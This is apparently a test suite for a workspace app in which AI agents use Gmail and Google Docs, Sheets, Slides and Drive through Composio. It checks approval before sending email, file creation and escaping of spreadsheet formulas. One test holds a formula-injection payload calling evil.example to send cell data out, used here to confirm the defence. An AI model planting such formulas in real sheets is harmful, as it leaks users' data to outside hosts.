// Google apps through Composio, against a stand-in for Composio's API: the
// server key, connecting an app (a Composio-managed sign-in, created once),
// agents reading through it without asking, writing only after approval,
// and disconnecting.

import assert from 'node:assert/strict';
import http from 'node:http';
import type {AddressInfo} from 'node:net';
import {after, before, describe, it} from 'node:test';

import {config} from '../src/config.js';
import {sheetValues} from '../src/connectors/google-files.js';
import {Catalog} from '../src/llm/catalog.js';

import {expectStatus, fakeProvider, type FakeRequest, lastUserText, model, signup, startServer, type TestServer, waitFor} from './helpers.js';

type Post = {id: string; type: string; message: string; userId: string; props: Record<string, any>};
type Run = {id: string; status: string; rootPostId: string | null; error: string | null};
type Seen = {method: string; path: string; key?: string; body: any};

function fakeComposio() {
    const seen: Seen[] = [];
    const accounts: {id: string; user_id: string; toolkit: {slug: string}; status: string}[] = [];
    const authConfigs: {id: string; toolkit: {slug: string}; is_composio_managed: boolean; status: string}[] = [];
    const schemas: Record<string, unknown> = {
        GMAIL_FETCH_EMAILS: {description: 'Fetch emails from Gmail.', input_parameters: {type: 'object', title: 'In', properties: {query: {type: 'string'}}}},
        GMAIL_SEND_EMAIL: {description: 'Send an email.', input_parameters: {recipient_email: {type: 'string', required: true}, subject: {type: 'string'}, body: {type: 'string', required: true}}},
        // Making Google files (create_document / create_presentation / create_spreadsheet).
        GOOGLEDOCS_CREATE_DOCUMENT_MARKDOWN: {description: 'Create a doc from Markdown.', input_parameters: {type: 'object', properties: {title: {type: 'string'}, markdown_text: {type: 'string'}}}},
        GOOGLESLIDES_CREATE_SLIDES_MARKDOWN: {description: 'Create slides from Markdown.', input_parameters: {type: 'object', properties: {title: {type: 'string'}, markdown_text: {type: 'string'}}}},
        GOOGLESHEETS_CREATE_GOOGLE_SHEET1: {description: 'Create a sheet.', input_parameters: {type: 'object', properties: {title: {type: 'string'}}}},
        GOOGLESHEETS_ADD_SHEET: {description: 'Add a tab.', input_parameters: {type: 'object', properties: {spreadsheet_id: {type: 'string'}, properties: {type: 'object'}}}},
        GOOGLESHEETS_VALUES_UPDATE: {description: 'Write values.', input_parameters: {type: 'object', properties: {spreadsheet_id: {type: 'string'}, range: {type: 'string'}, values: {type: 'array'}, value_input_option: {type: 'string'}}}},
        GOOGLEDRIVE_CREATE_FOLDER: {description: 'Create a folder.', input_parameters: {type: 'object', properties: {folder_name: {type: 'string'}, parent_id: {type: 'string'}}}},
        GOOGLEDRIVE_MOVE_FILE: {description: 'Move a file.', input_parameters: {type: 'object', properties: {file_id: {type: 'string'}, add_parents: {type: 'string'}, remove_parents: {type: 'string'}}}},
    };
    let made = 0;
    const answers: Record<string, () => unknown> = {
        GMAIL_FETCH_EMAILS: () => ({messages: [{subject: 'Q3 numbers', snippet: 'Revenue up 18%'}]}),
        GOOGLEDOCS_CREATE_DOCUMENT_MARKDOWN: () => ({response_data: {documentId: `doc_${++made}xxxxxxxxxx`, title: 'x'}}),
        GOOGLESLIDES_CREATE_SLIDES_MARKDOWN: () => ({presentation_url: `https://docs.google.com/presentation/d/pres_${++made}xxxxxxxxxx/edit`}),
        GOOGLESHEETS_CREATE_GOOGLE_SHEET1: () => ({spreadsheetId: `sheet_${++made}xxxxxxxxxx`}),
        GOOGLEDRIVE_CREATE_FOLDER: () => ({id: `folder_${++made}xxxxxxxxxx`, name: 'x'}),
    };
    const server = http.createServer((req, res) => {
        let raw = '';
        req.on('data', (c) => (raw += c));
        req.on('end', () => {
            const url = new URL(req.url!, 'http://x');
            const body = raw ? JSON.parse(raw) : null;
            const key = req.headers['x-api-key'] as string | undefined;
            seen.push({method: req.method!, path: url.pathname + url.search, key, body});
            const send = (status: number, json: unknown) => {
                res.writeHead(status, {'Content-Type': 'application/json'});
                res.end(JSON.stringify(json));
            };
            if (key !== 'good-composio-key') {
                return send(401, {error: {message: 'Invalid API key'}});
            }
            const p = url.pathname;
            if (req.method === 'GET' && p === '/auth_configs') {
                const slug = url.searchParams.get('toolkit_slug');
                return send(200, {items: authConfigs.filter((a) => !slug || a.toolkit.slug === slug)});
            }
            if (req.method === 'POST' && p === '/auth_configs') {
                const created = {id: `ac_${body.toolkit.slug}`, toolkit: {slug: body.toolkit.slug}, is_composio_managed: true, status: 'ENABLED'};
                authConfigs.push(created);
                return send(201, {toolkit: created.toolkit, auth_config: {id: created.id, is_composio_managed: true}});
            }
            if (req.method === 'POST' && p === '/connected_accounts/link') {
                const id = `ca_${accounts.length + 1}`;
                accounts.push({id, user_id: body.user_id, toolkit: {slug: body.auth_config_id.replace(/^ac_/, '')}, status: 'INITIATED'});
                return send(201, {redirect_url: `https://connect.example/link/${id}`, connected_account_id: id});
            }
            if (req.method === 'GET' && p === '/connected_accounts') {
                const user = url.searchParams.get('user_ids');
                return send(200, {items: accounts.filter((a) => a.user_id === user)});
            }
            if (req.method === 'DELETE' && p.startsWith('/connected_accounts/')) {
                const i = accounts.findIndex((a) => a.id === p.split('/').at(-1));
                if (i >= 0) {
                    accounts.splice(i, 1);
                }
                return send(200, {success: true});
            }
            if (req.method === 'GET' && p.startsWith('/tools/')) {
                const slug = decodeURIComponent(p.split('/').at(-1)!);
                return schemas[slug] ? send(200, {slug, ...schemas[slug] as object}) : send(404, {error: {message: 'Tool not found'}});
            }
            if (req.method === 'POST' && p.startsWith('/tools/execute/')) {
                const slug = decodeURIComponent(p.split('/').at(-1)!);
                return send(200, {successful: true, data: answers[slug]?.() ?? {ok: true}});
            }
            return send(404, {error: {message: 'not found'}});
        });
    });
    return {server, seen, accounts, authConfigs, answers};
}

describe('Google connections (Composio)', () => {
    let s: TestServer;
    let llm: Awaited<ReturnType<typeof fakeProvider>>;
    let fake: ReturnType<typeof fakeComposio>;
    let answers: Record<string, () => unknown>;
    let owner: Awaited<ReturnType<typeof signup>>;
    let member: Awaited<ReturnType<typeof signup>>;
    let wsId: string;
    let generalId: string;
    let ownerId: string;
    const was = {base: config.connectors.composioBaseUrl, key: config.connectors.composioKey};

    before(async () => {
        fake = fakeComposio();
        answers = fake.answers;
        await new Promise<void>((r) => fake.server.listen(0, '127.0.0.1', () => r()));
        config.connectors.composioBaseUrl = `http://127.0.0.1:${(fake.server.address() as AddressInfo).port}`;
        config.connectors.composioKey = '';
        llm = await fakeProvider((req: FakeRequest) => {
            const last = req.messages.at(-1)!;
            if (last.role === 'tool') {
                return {text: `From your email: ${String(last.content)}`};
            }
            const tools = (req.tools ?? []).map((t) => t.function.name);
            if (/check my email/.test(lastUserText(req)) && tools.includes('gmail_fetch_emails')) {
                return {toolCalls: [{name: 'gmail_fetch_emails', args: {query: 'Q3'}}]};
            }
            if (/write the launch brief/.test(lastUserText(req)) && tools.includes('create_document')) {
                return {toolCalls: [{name: 'create_document', args: {title: 'Launch brief', subtitle: 'For the team', markdown: '# Launch brief\n\n## Goal\n\nShip on **Tuesday**.\n\n- Demo video\n- Supporters list\n'}}]};
            }
            if (/make the launch deck/.test(lastUserText(req)) && tools.includes('create_presentation')) {
                return {toolCalls: [{name: 'create_presentation', args: {title: 'Launch deck', slides: [
                    {layout: 'title'},
                    {layout: 'stats', title: 'Day one, in numbers', stats: [{value: '900', label: 'Upvotes'}, {value: '#1', label: 'Rank'}]},
                    {layout: 'chart', title: 'Votes come early', chart: {type: 'bar', categories: ['12-4 AM', '4-8 AM'], series: [{name: 'Votes', values: [550, 160]}]}},
                    {layout: 'closing', title: 'Next steps', bullets: ['Line up supporters']},
                ]}}]};
            }
            if (/build the budget/.test(lastUserText(req)) && tools.includes('create_spreadsheet')) {
                return {toolCalls: [{name: 'create_spreadsheet', args: {title: 'Launch budget', sheets: [
                    {name: 'Budget', columns: [{header: 'Item'}, {header: 'Cost', type: 'currency'}, {header: 'Share', type: 'percent'}], rows: [['Ads', 1200, 0.4], ['Swag', '$300', '10%']], totals: true},
                    {name: 'Owners', columns: [{header: 'Item'}, {header: 'Owner'}], rows: [['Ads', 'Mia']]},
                ]}}]};
            }
            if (/email the team/.test(lastUserText(req)) && tools.includes('gmail_send_email')) {
                return {toolCalls: [{name: 'gmail_send_email', args: {recipient_email: 'team@example.com', subject: 'Q3', body: 'Up 18%.'}}]};
            }
            return {text: tools.some((t) => t.startsWith('gmail_')) ? 'has gmail' : 'no gmail'};
        });
        process.env.TEST_CONN_KEY = 'k';
        s = await startServer({catalog: new Catalog({
            providers: {p: {label: 'P', baseUrl: llm.url, apiKeyEnv: 'TEST_CONN_KEY'}},
            models: [model('m', 'easy', 1, [['p', 'm']]), model('b', 'balanced', 1, [['p', 'b']]), model('h', 'hard', 1, [['p', 'h']])],
        })});
        owner = await signup(s.base, {name: 'Grace', workspaceName: 'Connections'});
        [{id: wsId}] = await owner.api.get('/workspaces');
        ownerId = (await owner.api.get('/users/me')).id;
        const invite = await owner.api.post(`/workspaces/${wsId}/invites`, {});
        member = await signup(s.base, {name: 'Mia', invite: invite.token});
        generalId = (await owner.api.get(`/workspaces/${wsId}/channels`)).channels[0].id;
    });
    after(async () => {
        Object.assign(config.connectors, {composioBaseUrl: was.base, composioKey: was.key});
        await s.stop();
        await llm.close();
        await new Promise((r) => fake.server.close(() => r(null)));
    });

    const ask = async (message: string, statuses = ['succeeded', 'failed', 'waiting_approval']) => {
        const p: Post = await owner.api.post(`/channels/${generalId}/posts`, {message});
        const run = await waitFor(async () => ((await owner.api.get(`/channels/${generalId}/runs`)) as Run[]).find((r) => r.rootPostId === p.id && statuses.includes(r.status)), 15_000, 'run');
        return {post: p, run};
    };

    it('only someone who runs the server sets the Composio key, and only a key Composio accepts', async () => {
        const before = await owner.api.get(`/workspaces/${wsId}/connections`);
        assert.equal(before.configured, false);
        assert.equal(before.canSetUp, true);
        assert.deepEqual(before.apps.map((a: {toolkit: string}) => a.toolkit), ['gmail', 'googledrive', 'googledocs', 'googlesheets', 'googlecalendar', 'googleslides']);
        await expectStatus(member.api.put('/admin/connector-key', {apiKey: 'good-composio-key'}), 403);
        await expectStatus(owner.api.put('/admin/connector-key', {apiKey: 'wrong-composio-key'}), 400);
        await owner.api.put('/admin/connector-key', {apiKey: 'good-composio-key'});
        const after = await owner.api.get(`/workspaces/${wsId}/connections`);
        assert.equal(after.configured, true);
        assert.deepEqual(after.key, {source: 'settings', last4: '-key'});
        assert.equal((await member.api.get(`/workspaces/${wsId}/connections`)).key, null, 'members don\'t see the key');
    });

    it('agents don\'t have Gmail until you connect it', async () => {
        const {post} = await ask('@researcher do you have gmail?');
        const thread: Post[] = await owner.api.get(`/posts/${post.id}/thread`);
        assert.match(thread.at(-1)!.message, /no gmail/);
    });

    it('connecting goes through Composio\'s sign-in, as you, in this workspace', async () => {
        const {url} = await owner.api.post(`/workspaces/${wsId}/connections/gmail`, {});
        assert.match(url, /^https:\/\/connect\.example\/link\//);
        const link = fake.seen.find((x) => x.path === '/connected_accounts/link')!;
        assert.equal(link.body.user_id, `${ownerId}:${wsId}`);
        assert.equal(link.body.auth_config_id, 'ac_gmail');
        assert.match(link.body.callback_url, /\/connections\/done\?app=Gmail$/);
        assert.equal(fake.seen.filter((x) => x.method === 'POST' && x.path === '/auth_configs').length, 1, 'a managed sign-in, created once');
        assert.equal((await owner.api.get(`/workspaces/${wsId}/connections`)).apps[0].status, 'pending');
        fake.accounts[0].status = 'ACTIVE'; // signed in
        assert.equal((await owner.api.get(`/workspaces/${wsId}/connections`)).apps[0].status, 'connected');
        assert.equal((await member.api.get(`/workspaces/${wsId}/connections`)).apps[0].status, 'not_connected', 'Mia hasn\'t connected hers');
        await expectStatus(owner.api.post(`/workspaces/${wsId}/connections/myspace`, {}), 404);
        const page = await (await fetch(`${s.base}/connections/done?status=success&app=Gmail`)).text();
        assert.match(page, /Gmail is connected/);
    });

    it('an agent reads your Gmail without asking, through your connection', async () => {
        const {post, run} = await ask('@researcher check my email for the Q3 numbers');
        assert.equal(run.status, 'succeeded', run.error ?? '');
        const exec = fake.seen.find((x) => x.path === '/tools/execute/GMAIL_FETCH_EMAILS')!;
        assert.deepEqual(exec.body, {connected_account_id: 'ca_1', user_id: `${ownerId}:${wsId}`, arguments: {query: 'Q3'}});
        const thread: Post[] = await owner.api.get(`/posts/${post.id}/thread`);
        assert.ok(!thread.some((p) => p.type === 'decision'));
        assert.match(thread.at(-1)!.message, /Q3 numbers/);
        const tools = llm.requests.flatMap((r) => (r.tools ?? []).map((t) => t.function.name));
        assert.ok(tools.includes('gmail_send_email'), 'with the input schema Composio gives');
        assert.ok(!tools.includes('gmail_create_email_draft'), 'an action Composio doesn\'t have is left out');
    });

    it('sending email from your Gmail waits for your approval', async () => {
        const {post, run} = await ask('@writer email the team the Q3 numbers');
        assert.equal(run.status, 'waiting_approval');
        const card = ((await owner.api.get(`/posts/${post.id}/thread`)) as Post[]).find((p) => p.type === 'decision')!;
        assert.equal(card.props.decision.title, 'Gmail: send email');
        assert.ok(card.props.decision.fields.some((f: {label: string; value: string}) => f.label === 'recipient_email' && f.value === 'team@example.com'));
        assert.ok(!fake.seen.some((x) => x.path === '/tools/execute/GMAIL_SEND_EMAIL'), 'not sent before approval');
        // Not even a workspace admin may approve sending from someone else's Gmail.
        await owner.api.patch(`/workspaces/${wsId}/members/${(await member.api.get('/users/me')).id}`, {role: 'admin'});
        await expectStatus(member.api.post(`/posts/${card.id}/actions/approve`), 403);
        await owner.api.post(`/posts/${card.id}/actions/approve`);
        await waitFor(async () => fake.seen.some((x) => x.path === '/tools/execute/GMAIL_SEND_EMAIL'), 15_000, 'sent after approval');
    });

    it('disconnecting removes your connection', async () => {
        await owner.api.del(`/workspaces/${wsId}/connections/gmail`);
        assert.equal((await owner.api.get(`/workspaces/${wsId}/connections`)).apps[0].status, 'not_connected');
        assert.equal(fake.accounts.length, 0);
    });

    const reply = async (message: string) => {
        const {post, run} = await ask(message);
        assert.equal(run.status, 'succeeded', run.error ?? '');
        const thread: Post[] = await owner.api.get(`/posts/${post.id}/thread`);
        type WithFiles = Post & {rootId: string | null; files: {id: string; name: string; mime: string; url: string; props: Record<string, any>}[]};
        return (thread as WithFiles[]).find((p) => p.files?.length)!;
    };
    const executed = (slug: string) => fake.seen.filter((x) => x.path === `/tools/execute/${slug}`);

    it('without Google, a document is a Word file and a PDF, and nothing goes to Composio', async () => {
        const before = fake.seen.filter((x) => x.path.startsWith('/tools/execute/')).length;
        const post = await reply('@writer write the launch brief');
        assert.deepEqual(post.files.map((f) => f.name), ['Launch brief.docx', 'Launch brief.pdf']);
        const [docx, pdf] = post.files;
        assert.equal(docx.props.made, 'document');
        assert.ok(docx.props.words > 5);
        assert.equal(docx.props.pdf, pdf.id);
        assert.equal(pdf.props.copyOf, docx.id);
        assert.equal(docx.props.google, undefined);
        const bytes = Buffer.from(await (await fetch(`${s.base}${docx.url}`)).arrayBuffer());
        assert.equal(bytes.subarray(0, 2).toString(), 'PK', 'a real .docx (a zip)');
        assert.match((await (await fetch(`${s.base}${pdf.url}`)).text()).slice(0, 8), /^%PDF/);
        assert.equal(fake.seen.filter((x) => x.path.startsWith('/tools/execute/')).length, before);
    });

    it('with Google Docs and Drive connected, it is also a Google Doc, in Captain › the chat', async () => {
        for (const app of ['googledocs', 'googledrive', 'googleslides', 'googlesheets']) {
            await owner.api.post(`/workspaces/${wsId}/connections/${app}`, {});
        }
        fake.accounts.forEach((a) => (a.status = 'ACTIVE'));
        const chatName = (await owner.api.get(`/workspaces/${wsId}/channels`)).channels[0].displayName;
        const post = await reply('@writer write the launch brief');
        const docx = post.files.find((f) => f.name.endsWith('.docx'))!;
        const doc = executed('GOOGLEDOCS_CREATE_DOCUMENT_MARKDOWN').at(-1)!;
        assert.equal(doc.body.user_id, `${ownerId}:${wsId}`);
        assert.equal(doc.body.arguments.title, 'Launch brief');
        assert.match(doc.body.arguments.markdown_text, /^# Launch brief\n/);
        const folders = executed('GOOGLEDRIVE_CREATE_FOLDER').map((x) => x.body.arguments);
        assert.equal(folders.length, 2);
        assert.deepEqual(folders[0], {folder_name: 'Captain'});
        assert.equal(folders[1].folder_name, chatName);
        assert.match(folders[1].parent_id, /^folder_/);
        const move = executed('GOOGLEDRIVE_MOVE_FILE').at(-1)!.body.arguments;
        assert.match(move.file_id, /^doc_/);
        assert.match(move.add_parents, /^folder_/);
        assert.notEqual(move.add_parents, folders[1].parent_id, 'into the chat\'s folder, inside "Captain"');
        assert.equal(move.remove_parents, 'root');
        assert.equal(docx.props.google.app, 'docs');
        assert.equal(docx.props.google.url, `https://docs.google.com/document/d/${move.file_id}/edit`);
        assert.equal(docx.props.google.folder, `Captain › ${chatName}`);
        assert.ok(!(await owner.api.get(`/posts/${post.rootId ?? post.id}/thread`) as Post[]).some((p) => p.type === 'decision'), 'a new private file needs no approval');
    });

    it('decks and spreadsheets: PowerPoint and Excel, plus Google Slides and Sheets, in the same folder', async () => {
        const deck = await reply('@analyst make the launch deck');
        assert.equal(deck.files.length, 1);
        assert.equal(deck.files[0].name, 'Launch deck.pptx');
        assert.equal(deck.files[0].props.slides, 4);
        assert.match(deck.files[0].props.google.url, /^https:\/\/docs\.google\.com\/presentation\/d\/pres_/);
        const md = executed('GOOGLESLIDES_CREATE_SLIDES_MARKDOWN').at(-1)!.body.arguments.markdown_text;
        assert.match(md, /# Day one, in numbers[\s\S]*\*\*900\*\* Upvotes[\s\S]*---/);
        assert.equal(executed('GOOGLEDRIVE_CREATE_FOLDER').length, 2, 'the folders are made once');

        const sheet = await reply('@analyst build the budget');
        assert.equal(sheet.files[0].name, 'Launch budget.xlsx');
        assert.deepEqual([sheet.files[0].props.sheets, sheet.files[0].props.rows], [2, 3]);
        const id = sheet.files[0].props.google.id;
        assert.match(id, /^sheet_/);
        const tab = executed('GOOGLESHEETS_ADD_SHEET').at(-1)!.body.arguments;
        assert.deepEqual(tab, {spreadsheet_id: id, properties: {title: 'Owners'}});
        const [first, second] = executed('GOOGLESHEETS_VALUES_UPDATE').slice(-2).map((x) => x.body.arguments);
        assert.equal(first.range, 'A1');
        assert.equal(first.value_input_option, 'USER_ENTERED');
        assert.deepEqual(first.values.slice(2), [['Item', 'Cost', 'Share'], ['Ads', '$1,200.00', '40%'], ['Swag', '$300.00', '10%'], ['Total', '=SUM(B4:B5)', '']]);
        assert.equal(second.range, '\'Owners\'!A1');
    });

    it('text that Sheets would run as a formula stays text', () => {
        const values = sheetValues({name: 'S', columns: [{header: '=cmd'}, {header: 'Cost', type: 'currency'}], rows: [['=IMPORTDATA("https://evil.example/?x="&A1)', -5], ['@SUM(1)', 2]], totals: true}, 1);
        assert.deepEqual(values.slice(2), [
            ["'=cmd", 'Cost'],
            [`'=IMPORTDATA("https://evil.example/?x="&A1)`, '-$5.00'],
            ["'@SUM(1)", '$2.00'],
            ['Total', '=SUM(B4:B5)'],
        ]);
    });

    it('if Google says no, the Office file is still there', async () => {
        const before = {...answers};
        answers.GOOGLEDOCS_CREATE_DOCUMENT_MARKDOWN = () => null;
        try {
            const post = await reply('@writer write the launch brief');
            assert.equal(post.files[0].name, 'Launch brief.docx');
            assert.equal(post.files[0].props.google, undefined);
        } finally {
            Object.assign(answers, before);
        }
    });
});
